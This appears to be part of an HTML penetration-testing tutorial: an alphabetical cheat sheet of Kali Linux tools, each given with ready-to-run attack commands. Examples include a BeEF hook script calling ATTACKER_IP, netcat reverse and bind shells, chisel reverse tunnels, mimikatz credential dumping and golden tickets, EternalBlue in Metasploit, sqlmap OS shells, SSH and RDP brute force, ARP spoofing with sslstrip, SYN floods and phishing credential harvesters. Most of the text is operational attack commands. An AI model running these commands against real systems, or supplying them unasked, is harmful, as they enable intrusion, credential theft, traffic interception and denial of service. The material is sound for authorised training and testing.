+
+            <div class=\"metaphor-box\">
+                <h4>💡 Your Kali Toolbox at a Glance</h4>
+                <p><strong>Tool categories:</strong><br><br>
+                • <strong>Information Gathering:</strong> Reconnaissance, OSINT, enumeration<br>
+                • <strong>Vulnerability Analysis:</strong> Scanners, fuzzers, exploit verification<br>
+                • <strong>Web Application Analysis:</strong> Proxy, scanner, injection testing<br>
+                • <strong>Database Assessment:</strong> SQL injection, database enumeration<br>
+                • <strong>Password Attacks:</strong> Cracking, brute forcing, rainbow tables<br>
+                • <strong>Wireless Attacks:</strong> WiFi, Bluetooth, RFID, SDR<br>
+                • <strong>Reverse Engineering:</strong> Disassemblers, decompilers, debuggers<br>
+                • <strong>Exploitation Tools:</strong> Exploit frameworks, payload generators<br>
+                • <strong>Sniffing & Spoofing:</strong> Network analysis, MITM, poisoning<br>
+                • <strong>Post Exploitation:</strong> Persistence, privilege escalation, lateral movement<br>
+                • <strong>Forensics:</strong> File carving, memory analysis, timeline creation<br>
+                • <strong>Reporting Tools:</strong> Documentation, evidence preservation<br><br>
+                <strong>Tip:</strong> Use <code>apt-cache search [keyword]</code> to find tools by category!<br>
+                <strong>Example:</strong> <code>apt-cache search wireless | grep -i hack</code> → Find all wireless hacking tools</p>
+            </div>
+
+            <h3>A-Tools</h3>
+
+            <div class=\"code\"># ========== AIRCRACK-NG ==========
+# Category: Wireless Attacks
+# Purpose: Complete WiFi cracking suite (WEP, WPA/WPA2)
+
+# Install (pre-installed in Kali):
+sudo apt install aircrack-ng
+
+# Key tools in suite:
+# - airmon-ng   → Enable monitor mode
+# - airodump-ng → Capture packets
+# - aireplay-ng → Inject packets, deauth
+# - aircrack-ng → Crack captured handshakes
+
+# Basic workflow (see Bonus Part 1 for detailed guide):
+sudo airmon-ng start wlan0        # Enable monitor mode → wlan0mon
+sudo airodump-ng wlan0mon         # Scan for networks
+sudo airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon  # Capture handshake
+sudo aireplay-ng -0 5 -a [AP_MAC] wlan0mon               # Deauth to force handshake
+aircrack-ng -w wordlist.txt capture-01.cap               # Crack handshake
+
+# ========== AMASS ==========
+# Category: Information Gathering
+# Purpose: Subdomain enumeration (passive + active)
+
+sudo apt install amass
+
+# Passive enumeration (no target contact):
+amass enum -passive -d company.com
+
+# Active enumeration (includes DNS brute force):
+amass enum -active -d company.com -brute -w subdomains.txt
+
+# Output to file:
+amass enum -d company.com -o subdomains.txt
+
+# Use with other tools:
+amass enum -d company.com | httprobe > live_subdomains.txt
+
+# ========== ARMITAGE ==========
+# Category: Exploitation Tools
+# Purpose: GUI for Metasploit (team collaboration)
+
+sudo apt install armitage
+
+# Launch (requires Metasploit database):
+sudo msfdb init        # First time only
+sudo armitage
+
+# Features:
+# - Point-and-click exploit selection
+# - Visual network map
+# - Team server for collaboration
+# - Automated exploitation workflows
+
+# Use case: Red team engagements with multiple operators
+
+# ========== AUTOPSY ==========
+# Category: Forensics
+# Purpose: Digital forensics platform (GUI for Sleuthkit)
+# See Section 1 for detailed guide
+
+sudo apt install autopsy
+
+# Launch:
+autopsy
+
+# Web interface: http://localhost:9999/autopsy
+
+# Create case → Add image → Analyze!
+
+# ========== AWK (Pattern Scanning) ==========
+# Category: Utility
+# Purpose: Text processing, log analysis
+
+# Extract specific columns from output:
+cat access.log | awk '{print $1}'    # Print first column (IP addresses)
+
+# Filter by condition:
+netstat -an | awk '/ESTABLISHED/ {print $5}'  # Show established connections
+
+# Sum values:
+cat numbers.txt | awk '{sum += $1} END {print sum}'
+
+# Use case: Parse nmap output, extract IPs from logs</div>
+
+            <h3>B-Tools</h3>
+
+            <div class=\"code\"># ========== BEEF (Browser Exploitation Framework) ==========
+# Category: Exploitation Tools
+# Purpose: Client-side attacks via web browser
+
+sudo apt install beef-xss
+
+# Start BeEF:
+sudo beef-xss
+
+# Web UI: http://127.0.0.1:3000/ui/panel
+# Default creds: beef / beef
+
+# Hook browser with JavaScript:
+<script src=\"http://ATTACKER_IP:3000/hook.js\"></script>
+
+# Once browser is hooked:
+# - Execute commands
+# - Keylog
+# - Redirect
+# - Social engineering attacks
+# - Detect plugins, browser info
+
+# ========== BETTERCAP ==========
+# Category: Sniffing & Spoofing
+# Purpose: Modern MITM framework (replaces Ettercap)
+
+sudo apt install bettercap
+
+# Interactive mode:
+sudo bettercap
+
+# Enable modules:
+» net.probe on              # Discover hosts
+» net.show                  # Show discovered hosts
+» set arp.spoof.targets 192.168.1.100  # Target specific host
+» arp.spoof on              # Start ARP spoofing
+» net.sniff on              # Capture traffic
+
+# HTTP/HTTPS proxy:
+» set http.proxy.sslstrip true
+» http.proxy on
+
+# Credentials harvesting:
+» set net.sniff.filter \"port 80 or port 21 or port 110\"
+
+# Scripting (caplets):
+bettercap -caplet caplet.cap
+
+# ========== BINWALK ==========
+# Category: Forensics / Reverse Engineering
+# Purpose: Firmware analysis, file carving
+# See Section 1 for detailed guide
+
+sudo apt install binwalk
+
+# Analyze firmware:
+binwalk firmware.bin
+
+# Extract embedded files:
+binwalk -e firmware.bin
+
+# Entropy analysis (find encrypted sections):
+binwalk -E firmware.bin
+
+# Signature scan:
+binwalk -B firmware.bin
+
+# ========== BURP SUITE ==========
+# Category: Web Application Analysis
+# Purpose: Web proxy, scanner, intruder
+# See Bonus Part 1 for detailed guide
+
+# Community Edition (pre-installed):
+burpsuite
+
+# Key features:
+# - Proxy: Intercept HTTP/HTTPS
+# - Repeater: Modify and resend requests
+# - Intruder: Automated attacks (brute force, fuzzing)
+# - Scanner: Vulnerability detection (Pro only)
+# - Extensions: Add custom functionality
+
+# Pro version:
+# - Active scanner
+# - Faster intruder
+# - Scheduled scans</div>
+
+            <h3>C-Tools</h3>
+
+            <div class=\"code\"># ========== CHISEL ==========
+# Category: Post Exploitation
+# Purpose: Fast TCP/UDP tunnel over HTTP (pivot)
+
+# Download latest:
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+mv chisel_1.9.1_linux_amd64 chisel
+
+# On attacker (server):
+./chisel server -p 8080 --reverse
+
+# On target (client):
+./chisel client ATTACKER_IP:8080 R:1080:socks
+
+# Use with proxychains:
+proxychains nmap -sT 10.10.10.0/24
+
+# ========== CRACKMAPEXEC (CME) ==========
+# Category: Post Exploitation
+# Purpose: Active Directory attacks, SMB enumeration
+
+sudo apt install crackmapexec
+
+# SMB enumeration:
+crackmapexec smb 192.168.1.0/24                    # Find SMB hosts
+crackmapexec smb 192.168.1.100 -u '' -p ''        # Null session
+crackmapexec smb 192.168.1.100 -u admin -p password123  # Auth check
+
+# Password spraying:
+crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!'
+
+# Dump SAM:
+crackmapexec smb 192.168.1.100 -u admin -p password123 --sam
+
+# Execute commands:
+crackmapexec smb 192.168.1.100 -u admin -p password123 -x \"whoami\"
+
+# Pass-the-Hash:
+crackmapexec smb 192.168.1.100 -u admin -H [NTLM_HASH]
+
+# ========== COMMIX ==========
+# Category: Web Application Analysis
+# Purpose: Command injection exploitation
+
+sudo apt install commix
+
+# Basic scan:
+commix --url=\"http://target.com/page.php?id=1\"
+
+# POST parameter:
+commix --url=\"http://target.com/login.php\" --data=\"user=admin&pass=1\"
+
+# Cookie injection:
+commix --url=\"http://target.com/\" --cookie=\"session=VALUE\"
+
+# Custom injection point:
+commix --url=\"http://target.com/page.php?id=INJECT_HERE\"
+
+# ========== CRUNCH ==========
+# Category: Password Attacks
+# Purpose: Custom wordlist generator
+
+sudo apt install crunch
+
+# Generate 4-8 character wordlist (lowercase):
+crunch 4 8 -o wordlist.txt
+
+# Specific character set:
+crunch 6 6 0123456789 -o pins.txt    # 6-digit PINs
+
+# Pattern:
+crunch 8 8 -t @@@@%%%% -o wordlist.txt
+# @ = lowercase
+# , = uppercase
+# % = numbers
+# ^ = special
+
+# Example: Password2024!
+crunch 13 13 -t Password%%%%^ -o custom.txt
+
+# Pipe to aircrack:
+crunch 8 8 | aircrack-ng -w - -b [BSSID] capture.cap</div>
+
+            <h3>D-Tools</h3>
+
+            <div class=\"code\"># ========== DIRB ==========
+# Category: Web Application Analysis
+# Purpose: Web directory/file brute forcing
+
+sudo apt install dirb
+
+# Basic scan:
+dirb http://target.com/
+
+# Custom wordlist:
+dirb http://target.com/ /path/to/wordlist.txt
+
+# Extensions:
+dirb http://target.com/ -X .php,.txt,.bak
+
+# Save output:
+dirb http://target.com/ -o results.txt
+
+# Use proxy:
+dirb http://target.com/ -p http://127.0.0.1:8080
+
+# ========== DIRBUSTER ==========
+# Category: Web Application Analysis
+# Purpose: GUI directory brute forcer
+
+dirbuster
+
+# GUI workflow:
+# 1. Target URL: http://target.com
+# 2. Wordlist: /usr/share/wordlists/dirbuster/
+# 3. File extensions: php, txt, bak
+# 4. Threads: 10
+# 5. Start!
+
+# ========== DNSENUM ==========
+# Category: Information Gathering
+# Purpose: DNS enumeration (subdomains, zone transfers)
+
+sudo apt install dnsenum
+
+# Basic enumeration:
+dnsenum company.com
+
+# Try zone transfer:
+dnsenum --enum company.com
+
+# Custom DNS server:
+dnsenum --dnsserver 8.8.8.8 company.com
+
+# Save output:
+dnsenum --output results.xml company.com
+
+# ========== DNSRECON ==========
+# Category: Information Gathering
+# Purpose: DNS reconnaissance and enumeration
+
+sudo apt install dnsrecon
+
+# Standard enumeration:
+dnsrecon -d company.com
+
+# Zone transfer:
+dnsrecon -d company.com -t axfr
+
+# Brute force subdomains:
+dnsrecon -d company.com -t brt -D /usr/share/wordlists/dnsmap.txt
+
+# Reverse lookup (find domains on IP):
+dnsrecon -r 192.168.1.0/24
+
+# Google dorking for subdomains:
+dnsrecon -d company.com -t goo
+
+# ========== DMITRY ==========
+# Category: Information Gathering
+# Purpose: Deepmagic Information Gathering Tool
+
+sudo apt install dmitry
+
+# All checks:
+dmitry -winsepo results.txt company.com
+
+# Flags:
+# -w  → WHOIS lookup
+# -i  → IP WHOIS
+# -n  → Netcraft.com lookup
+# -s  → Subdomain search
+# -e  → Email search
+# -p  → Port scan
+# -o  → Output to file</div>
+
+            <h3>E-Tools</h3>
+
+            <div class=\"code\"># ========== ENUM4LINUX ==========
+# Category: Information Gathering
+# Purpose: SMB/Windows enumeration
+
+sudo apt install enum4linux
+
+# Full enumeration:
+enum4linux -a 192.168.1.100
+
+# Specific checks:
+enum4linux -U 192.168.1.100    # Users
+enum4linux -S 192.168.1.100    # Shares
+enum4linux -G 192.168.1.100    # Groups
+enum4linux -P 192.168.1.100    # Password policy
+
+# With credentials:
+enum4linux -u admin -p password123 192.168.1.100
+
+# ========== ETTERCAP ==========
+# Category: Sniffing & Spoofing
+# Purpose: MITM attacks, ARP poisoning
+
+sudo apt install ettercap-graphical
+
+# GUI mode:
+sudo ettercap -G
+
+# Workflow:
+# 1. Sniff → Unified sniffing → Select interface
+# 2. Hosts → Scan for hosts
+# 3. Select target 1 (victim) → Add to Target 1
+# 4. Select target 2 (gateway) → Add to Target 2
+# 5. Mitm → ARP poisoning → Sniff remote connections
+# 6. Start sniffing!
+
+# CLI mode (ARP poisoning):
+sudo ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
+
+# ========== EXIFTOOL ==========
+# Category: Forensics / OSINT
+# Purpose: Read/write/edit metadata
+
+sudo apt install exiftool
+
+# View metadata:
+exiftool image.jpg
+
+# View specific field:
+exiftool -Author document.pdf
+
+# Remove ALL metadata:
+exiftool -all= image.jpg
+
+# Geolocation from photo:
+exiftool -gps:all image.jpg
+
+# Batch process:
+exiftool -all= *.jpg
+
+# Extract thumbnail:
+exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg
+
+# ========== EXPLOITDB ==========
+# Category: Exploitation Tools
+# Purpose: Local copy of Exploit-DB
+
+sudo apt install exploitdb
+
+# Search exploits:
+searchsploit apache
+
+# Filter by platform:
+searchsploit linux kernel 3.13
+
+# Show exploit path:
+searchsploit -p 12345
+
+# Copy exploit to current directory:
+searchsploit -m 12345
+
+# Update database:
+searchsploit -u</div>
+
+            <h3>F-G-Tools</h3>
+
+            <div class=\"code\"># ========== FIERCE ==========
+# Category: Information Gathering
+# Purpose: DNS scanner, subdomain brute force
+
+sudo apt install fierce
+
+# Basic scan:
+fierce --domain company.com
+
+# Use custom wordlist:
+fierce --domain company.com --wordlist subdomains.txt
+
+# Specific DNS server:
+fierce --domain company.com --dns-servers 8.8.8.8
+
+# ========== FOREMOST ==========
+# Category: Forensics
+# Purpose: File carving from disk images
+# See Section 1 for detailed guide
+
+sudo apt install foremost
+
+# Carve deleted files:
+foremost -i disk.img -o output/
+
+# Specific file types:
+foremost -t jpg,png,pdf -i disk.img -o output/
+
+# ========== GOBUSTER ==========
+# Category: Web Application Analysis
+# Purpose: Directory/DNS brute forcing (faster than dirb)
+
+sudo apt install gobuster
+
+# Directory brute force:
+gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt
+
+# Add extensions:
+gobuster dir -u http://target.com/ -w wordlist.txt -x php,txt,html
+
+# DNS subdomain brute force:
+gobuster dns -d company.com -w subdomains.txt
+
+# Virtual host discovery:
+gobuster vhost -u http://target.com -w wordlist.txt
+
+# With authentication:
+gobuster dir -u http://target.com -w wordlist.txt -U admin -P password123
+
+# ========== GOPHISH ==========
+# Category: Social Engineering
+# Purpose: Phishing campaign framework
+
+sudo apt install gophish
+
+# Start:
+sudo gophish
+
+# Web interface: https://127.0.0.1:3333
+# Default creds: admin / gophish
+
+# Workflow:
+# 1. Create email template
+# 2. Create landing page
+# 3. Import user list (CSV)
+# 4. Configure sending profile (SMTP)
+# 5. Launch campaign
+# 6. Track results (opened emails, clicked links, submitted credentials)
+
+# ========== GREENBONE / OPENVAS ==========
+# Category: Vulnerability Analysis
+# Purpose: Vulnerability scanner
+
+sudo apt install gvm
+
+# Setup (first time):
+sudo gvm-setup
+sudo gvm-start
+
+# Web interface: https://127.0.0.1:9392
+# Credentials shown after gvm-setup
+
+# Create scan:
+# 1. Configuration → Targets → New target
+# 2. Scans → Tasks → New task
+# 3. Start scan
+# 4. View results → Generate report</div>
+
+            <h3>H-Tools</h3>
+
+            <div class=\"code\"># ========== HASHCAT ==========
+# Category: Password Attacks
+# Purpose: GPU-accelerated password cracking
+# See Bonus Part 1 for detailed guide
+
+sudo apt install hashcat
+
+# Benchmark:
+hashcat -b
+
+# Crack MD5:
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# Crack NTLM (Windows):
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+
+# Brute force (8 chars, lowercase):
+hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l
+
+# Rules (mangle wordlist):
+hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule
+
+# Show cracked:
+hashcat -m 0 hash.txt --show
+
+# ========== HPING3 ==========
+# Category: Sniffing & Spoofing
+# Purpose: Packet crafting, firewall testing
+
+sudo apt install hping3
+
+# Ping with custom packet:
+sudo hping3 -1 192.168.1.1     # ICMP ping
+
+# SYN flood (DoS test):
+sudo hping3 -S --flood -p 80 192.168.1.1
+
+# Port scan (SYN):
+sudo hping3 -S -p 80 192.168.1.1
+
+# Traceroute:
+sudo hping3 --traceroute -S -p 80 192.168.1.1
+
+# Firewall test:
+sudo hping3 -S -p 80 192.168.1.1 -c 1
+
+# ========== HYDRA ==========
+# Category: Password Attacks
+# Purpose: Brute force login services
+# See Bonus Part 1 for detailed guide
+
+sudo apt install hydra
+
+# SSH brute force:
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# FTP:
+hydra -L users.txt -P passwords.txt ftp://192.168.1.100
+
+# HTTP POST form:
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\"
+
+# RDP:
+hydra -l administrator -P passwords.txt rdp://192.168.1.100
+
+# SMB:
+hydra -l admin -P passwords.txt smb://192.168.1.100</div>
+
+            <h3>I-J-K-Tools</h3>
+
+            <div class=\"code\"># ========== IMPACKET ==========
+# Category: Exploitation / Post Exploitation
+# Purpose: Python scripts for Windows protocols
+
+sudo apt install impacket-scripts
+
+# Key scripts:
+
+# psexec.py - Remote command execution:
+psexec.py DOMAIN/user:password@192.168.1.100
+
+# secretsdump.py - Dump hashes:
+secretsdump.py DOMAIN/user:password@192.168.1.100
+
+# GetNPUsers.py - AS-REP Roasting:
+GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.10
+
+# GetUserSPNs.py - Kerberoasting:
+GetUserSPNs.py -request DOMAIN/user:password -dc-ip 192.168.1.10
+
+# smbexec.py - Execute via SMB:
+smbexec.py DOMAIN/user:password@192.168.1.100
+
+# wmiexec.py - Execute via WMI:
+wmiexec.py DOMAIN/user:password@192.168.1.100
+
+# ========== JOHN THE RIPPER ==========
+# Category: Password Attacks
+# Purpose: Password cracking (CPU-based)
+# See Bonus Part 1 for detailed guide
+
+sudo apt install john
+
+# Crack password file:
+john hashes.txt
+
+# With wordlist:
+john --wordlist=rockyou.txt hashes.txt
+
+# Show cracked:
+john --show hashes.txt
+
+# Generate wordlist with rules:
+john --wordlist=words.txt --rules --stdout > mangled.txt
+
+# Crack specific format:
+john --format=raw-md5 hashes.txt
+
+# ========== KISMET ==========
+# Category: Wireless Attacks
+# Purpose: WiFi/Bluetooth monitoring
+# See Section 5 for detailed guide
+
+sudo apt install kismet
+
+# Start:
+sudo kismet
+
+# Web UI: http://localhost:2501
+
+# Features:
+# - Detect hidden SSIDs
+# - Track clients
+# - GPS integration for wardriving
+# - Bluetooth detection
+# - Channel hopping</div>
+
+            <h3>L-M-Tools</h3>
+
+            <div class=\"code\"># ========== LEGION ==========
+# Category: Information Gathering
+# Purpose: Automated reconnaissance framework
+
+sudo apt install legion
+
+# Launch:
+sudo legion
+
+# Features:
+# - Automatic port scanning (nmap)
+# - Service enumeration
+# - Vulnerability detection
+# - Brute force attacks
+# - Scheduled scans
+
+# ========== MASSCAN ==========
+# Category: Information Gathering
+# Purpose: Ultra-fast port scanner (1 million packets/sec)
+
+sudo apt install masscan
+
+# Scan 10.0.0.0/8 (16 million IPs) in 5 minutes:
+sudo masscan 10.0.0.0/8 -p80,443
+
+# Scan all ports:
+sudo masscan 192.168.1.0/24 -p0-65535
+
+# Output to file:
+sudo masscan 10.0.0.0/8 -p80 -oG output.txt
+
+# Rate limit:
+sudo masscan 10.0.0.0/8 -p80 --rate 10000
+
+# ========== MEDUSA ==========
+# Category: Password Attacks
+# Purpose: Brute force (alternative to Hydra)
+
+sudo apt install medusa
+
+# SSH brute force:
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
+
+# FTP:
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp
+
+# HTTP:
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin
+
+# List modules:
+medusa -d
+
+# ========== METASPLOIT ==========
+# Category: Exploitation Tools
+# Purpose: Exploit framework
+# See Bonus Part 1 for detailed guide
+
+sudo msfconsole
+
+# Search exploits:
+msf6 > search type:exploit platform:windows smb
+
+# Use exploit:
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# Set options:
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
+
+# Run:
+msf6 exploit(ms17_010_eternalblue) > run
+
+# Meterpreter commands:
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > shell
+
+# ========== MIMIKATZ ==========
+# Category: Post Exploitation
+# Purpose: Extract Windows credentials
+
+# Download:
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+
+# Usage (on Windows target):
+mimikatz.exe
+
+# Dump credentials:
+mimikatz # sekurlsa::logonpasswords
+
+# Pass-the-Hash:
+mimikatz # sekurlsa::pth /user:admin /domain:company /ntlm:[HASH]
+
+# Dump LSA secrets:
+mimikatz # lsadump::secrets
+
+# Golden Ticket:
+mimikatz # kerberos::golden /user:admin /domain:company.com /sid:[SID] /krbtgt:[HASH] /ptt</div>
+
+            <h3>N-O-Tools</h3>
+
+            <div class=\"code\"># ========== NETCAT (NC) ==========
+# Category: Sniffing & Spoofing / Post Exploitation
+# Purpose: Swiss army knife of networking
+
+# Pre-installed in Kali
+
+# Listen for connection:
+nc -lvnp 4444
+
+# Connect to listener:
+nc 192.168.1.10 4444
+
+# Reverse shell (victim):
+nc 192.168.1.10 4444 -e /bin/bash
+
+# Bind shell (victim):
+nc -lvnp 4444 -e /bin/bash
+
+# Transfer file:
+# Receiver:
+nc -lvnp 4444 > file.txt
+# Sender:
+nc 192.168.1.10 4444 < file.txt
+
+# Port scanning:
+nc -zv 192.168.1.100 1-1000
+
+# ========== NIKTO ==========
+# Category: Web Application Analysis
+# Purpose: Web server scanner (finds misconfigurations, outdated software)
+
+sudo apt install nikto
+
+# Basic scan:
+nikto -h http://target.com
+
+# Scan specific port:
+nikto -h http://target.com -p 8080
+
+# Save output:
+nikto -h http://target.com -o report.html -Format html
+
+# Use proxy (Burp):
+nikto -h http://target.com -useproxy http://127.0.0.1:8080
+
+# Tuning (specific checks):
+nikto -h http://target.com -Tuning 1  # Interesting files
+nikto -h http://target.com -Tuning 2  # Misconfiguration
+nikto -h http://target.com -Tuning 3  # Information disclosure
+
+# ========== NMAP ==========
+# Category: Information Gathering
+# Purpose: Network scanner (THE TOOL)
+
+sudo apt install nmap
+
+# Basic scan:
+nmap 192.168.1.100
+
+# Scan all ports:
+nmap -p- 192.168.1.100
+
+# Service version detection:
+nmap -sV 192.168.1.100
+
+# OS detection:
+nmap -O 192.168.1.100
+
+# Aggressive scan:
+nmap -A 192.168.1.100
+
+# Stealth scan (SYN):
+sudo nmap -sS 192.168.1.100
+
+# UDP scan:
+sudo nmap -sU 192.168.1.100
+
+# Script scan:
+nmap --script vuln 192.168.1.100
+
+# Output to file:
+nmap 192.168.1.100 -oA results  # Creates .nmap, .xml, .gnmap
+
+# ========== OPENVAS ==========
+# See Greenbone/OpenVAS above
+
+# ========== OWASP ZAP ==========
+# Category: Web Application Analysis
+# Purpose: Web proxy and scanner (OWASP project)
+
+sudo apt install zaproxy
+
+# Launch:
+zaproxy
+
+# Features:
+# - Automated scanner
+# - Spider/crawler
+# - Fuzzer
+# - Proxy
+# - Active/passive scanning
+
+# API mode:
+zap.sh -daemon -port 8080 -config api.key=YOUR_KEY</div>
+
+            <h3>P-Q-R-Tools</h3>
+
+            <div class=\"code\"># ========== POWERSHELL EMPIRE (Starkiller) ==========
+# Category: Post Exploitation
+# Purpose: PowerShell C2 framework
+
+# Install:
+sudo apt install powershell-empire starkiller
+
+# Start Empire server:
+sudo powershell-empire server
+
+# Start Starkiller GUI:
+starkiller
+
+# Web UI: https://localhost:1337
+# Default: empireadmin / password123
+
+# ========== PROXYCHAINS ==========
+# Category: Post Exploitation
+# Purpose: Force TCP connections through proxy (SOCKS4/5)
+
+sudo apt install proxychains4
+
+# Configure:
+sudo nano /etc/proxychains4.conf
+
+# Add at bottom:
+socks5 127.0.0.1 1080
+
+# Use:
+proxychains nmap -sT 10.10.10.100
+proxychains firefox
+proxychains ssh user@10.10.10.100
+
+# ========== RADARE2 ==========
+# Category: Reverse Engineering
+# Purpose: Command-line RE framework
+# See Section 6 for detailed guide
+
+sudo apt install radare2
+
+# Open binary:
+r2 binary
+
+# Analyze:
+[0x00000000]> aaa
+
+# List functions:
+[0x00000000]> afl
+
+# Disassemble main:
+[0x00000000]> pdf @main
+
+# ========== REAVER ==========
+# Category: Wireless Attacks
+# Purpose: WPS PIN brute force
+
+sudo apt install reaver
+
+# Put interface in monitor mode:
+sudo airmon-ng start wlan0
+
+# Scan for WPS-enabled APs:
+sudo wash -i wlan0mon
+
+# Attack:
+sudo reaver -i wlan0mon -b [AP_MAC] -vv
+
+# Advanced:
+sudo reaver -i wlan0mon -b [AP_MAC] -vv -d 15 -T 0.5 -c 6
+
+# ========== RESPONDER ==========
+# Category: Post Exploitation
+# Purpose: LLMNR/NBT-NS/MDNS poisoning (capture NTLM hashes)
+
+sudo apt install responder
+
+# Start:
+sudo responder -I eth0 -wv
+
+# Flags:
+# -I  → Interface
+# -w  → Start WPAD rogue proxy
+# -v  → Verbose
+
+# Captured hashes saved to:
+# /usr/share/responder/logs/
+
+# Crack with hashcat:
+hashcat -m 5600 captured.txt rockyou.txt
+
+# ========== ROUTERSPLOIT ==========
+# Category: Exploitation Tools
+# Purpose: Router exploitation framework
+
+sudo apt install routersploit
+
+# Launch:
+rsf
+
+# Search exploits:
+rsf > search cisco
+
+# Use exploit:
+rsf > use exploits/routers/cisco/http_auth_bypass
+
+# Set target:
+rsf > set target 192.168.1.1
+
+# Run:
+rsf > run</div>
+
+            <h3>S-Tools (Part 1)</h3>
+
+            <div class=\"code\"># ========== SCAPY ==========
+# Category: Sniffing & Spoofing
+# Purpose: Packet manipulation library
+# See Section 9 for detailed guide
+
+sudo apt install python3-scapy
+
+# Interactive:
+sudo scapy
+
+# Create packet:
+>>> packet = IP(dst=\"192.168.1.1\")/ICMP()
+
+# Send:
+>>> send(packet)
+
+# Send and receive:
+>>> response = sr1(IP(dst=\"192.168.1.1\")/ICMP())
+
+# ========== SET (Social Engineer Toolkit) ==========
+# Category: Social Engineering
+# Purpose: Social engineering attacks
+
+sudo apt install set
+
+# Launch:
+sudo setoolkit
+
+# Menu:
+# 1. Social-Engineering Attacks
+# 2. Website Attack Vectors
+# 3. Credential Harvester
+# 4. Clone target website
+# 5. Enter target URL
+
+# Creates fake login page
+# Captures credentials when victim logs in
+
+# ========== SKIPFISH ==========
+# Category: Web Application Analysis
+# Purpose: Active web application security scanner
+
+sudo apt install skipfish
+
+# Basic scan:
+skipfish -o output/ http://target.com
+
+# Authenticated scan (cookie):
+skipfish -o output/ -C \"session=abc123\" http://target.com
+
+# POST login:
+skipfish -o output/ -A admin:password http://target.com
+
+# ========== SLEUTHKIT ==========
+# Category: Forensics
+# Purpose: Filesystem analysis
+# See Section 1 for detailed guide
+
+sudo apt install sleuthkit
+
+# List files:
+fls disk.img
+
+# Extract file:
+icat disk.img [inode] > extracted_file
+
+# Timeline:
+fls -r -m / disk.img > timeline.csv
+
+# ========== SQLMAP ==========
+# Category: Database Assessment
+# Purpose: Automated SQL injection
+# See Bonus Part 1 for detailed guide
+
+sudo apt install sqlmap
+
+# Basic test:
+sqlmap -u \"http://target.com/page.php?id=1\"
+
+# POST:
+sqlmap -u \"http://target.com/login.php\" --data=\"user=admin&pass=1\"
+
+# Dump database:
+sqlmap -u \"http://target.com/page.php?id=1\" --dbs
+sqlmap -u \"http://target.com/page.php?id=1\" -D database --tables
+sqlmap -u \"http://target.com/page.php?id=1\" -D database -T users --dump
+
+# OS shell:
+sqlmap -u \"http://target.com/page.php?id=1\" --os-shell
+
+# ========== SSLSCAN ==========
+# Category: Information Gathering
+# Purpose: Test SSL/TLS configuration
+
+sudo apt install sslscan
+
+# Scan:
+sslscan target.com
+
+# Output shows:
+# - Supported SSL/TLS versions
+# - Cipher suites
+# - Certificate details
+# - Vulnerabilities (Heartbleed, POODLE, etc.)</div>
+
+            <h3>S-Tools (Part 2)</h3>
+
+            <div class=\"code\"># ========== SSLSTRIP ==========
+# Category: Sniffing & Spoofing
+# Purpose: Downgrade HTTPS to HTTP (MITM)
+
+sudo apt install sslstrip
+
+# With ARP spoofing:
+# Terminal 1: Enable forwarding
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Terminal 2: ARP spoof
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# Terminal 3: SSLstrip
+sudo sslstrip -l 8080
+
+# Terminal 4: Redirect traffic
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# Captured credentials in sslstrip.log
+
+# ========== SUBLIST3R ==========
+# Category: Information Gathering
+# Purpose: Subdomain enumeration
+
+sudo apt install sublist3r
+
+# Basic:
+sublist3r -d company.com
+
+# Save output:
+sublist3r -d company.com -o subdomains.txt
+
+# Enable brute force:
+sublist3r -d company.com -b
+
+# Specific search engines:
+sublist3r -d company.com -e google,bing,yahoo</div>
+
+            <h3>T-U-V-Tools</h3>
+
+            <div class=\"code\"># ========== TCPDUMP ==========
+# Category: Sniffing & Spoofing
+# Purpose: Packet capture (CLI)
+
+# Capture on interface:
+sudo tcpdump -i eth0
+
+# Save to file:
+sudo tcpdump -i eth0 -w capture.pcap
+
+# Filter:
+sudo tcpdump -i eth0 port 80                # HTTP
+sudo tcpdump -i eth0 host 192.168.1.100    # Specific host
+sudo tcpdump -i eth0 'tcp[13] & 2 != 0'    # SYN packets
+
+# Read pcap:
+tcpdump -r capture.pcap
+
+# ========== TESTSSL ==========
+# Category: Information Gathering
+# Purpose: Test SSL/TLS (more detailed than sslscan)
+
+git clone https://github.com/drwetter/testssl.sh.git
+cd testssl.sh
+
+# Run:
+./testssl.sh target.com
+
+# Checks:
+# - Certificate validity
+# - Heartbleed
+# - CCS injection
+# - Ticketbleed
+# - ROBOT attack
+# - Cipher strength
+# - TLS version support
+
+# ========== THEHARVESTER ==========
+# See Section 11 for detailed guide
+
+theHarvester -d company.com -b all
+
+# ========== UNIX-PRIVESC-CHECK ==========
+# Category: Post Exploitation
+# Purpose: Find privilege escalation vectors (Linux)
+
+# Download:
+wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check
+chmod +x unix-privesc-check
+
+# Run:
+./unix-privesc-check standard
+./unix-privesc-check detailed
+
+# Checks:
+# - SUID/SGID files
+# - Writable config files
+# - Weak file permissions
